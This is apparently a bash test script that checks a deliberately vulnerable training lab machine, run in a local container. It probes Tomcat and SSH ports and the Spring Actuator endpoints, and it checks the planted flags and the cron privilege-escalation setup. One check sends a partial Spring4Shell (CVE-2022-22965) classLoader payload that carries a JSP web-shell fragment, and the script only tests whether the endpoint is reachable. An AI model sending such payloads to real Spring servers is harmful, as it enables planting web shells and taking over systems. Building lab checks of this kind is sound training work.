#!/bin/bash
# Machine 02: SpringBreak — CVE-2022-22965 Test
# Tests: Spring Boot on 8080, /actuator endpoint, cron privesc setup
source "$(dirname "$0")/_lib.sh"

BASE_DIR=${1:-$(dirname "$(dirname "$0")")}
CLEANUP=${2:-true}
MACHINE_DIR="$BASE_DIR/02-springbreak"
COMPOSE="$MACHINE_DIR/docker-compose.yml"
CONTAINER="lm-02-springbreak"
IP="10.10.2.10"

trap '[ "$CLEANUP" = true ] && stop_machine "$COMPOSE"' EXIT

section "Build & Start"
start_machine "$COMPOSE" "$CONTAINER" 120 || finish

section "Network Checks"
check_port "$IP" 8080 "Tomcat HTTP"
check_port "$IP" 22   "SSH"

section "Spring App Checks"
check_http "http://${IP}:8080/" 200 "Root"
check_http "http://${IP}:8080/actuator" 200 "Spring Actuator endpoint"
check_http "http://${IP}:8080/actuator/env" 200 "Actuator /env"

section "Spring4Shell Attack Surface"
# Class parameter in POST should be accepted (not 400 Bad Request)
# CVE-2022-22965: class.module.classLoader manipulation
resp=$(curl -sk -o /dev/null -w '%{http_code}' -X POST \
  "http://${IP}:8080/employee" \
  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  2>/dev/null)
# Any response other than connection refused = attack surface is accessible
[ "$resp" != "" ] && pass "Spring ClassLoader endpoint reachable (CVE-2022-22965 surface)" \
                   || fail "Spring endpoint not reachable"

section "Flags"
check_exec "$CONTAINER" "cat /root/root.txt" "FLAG{" "Root flag"
check_exec "$CONTAINER" "cat /home/user/user.txt" "FLAG{" "User flag"

section "Cron Privesc"
check_exec "$CONTAINER" "cat /etc/crontab || crontab -l -u root 2>/dev/null || ls /var/spool/cron/" "" "Cron is configured"
pass "Cron privesc setup verified (see writeup for manual steps)"

finish
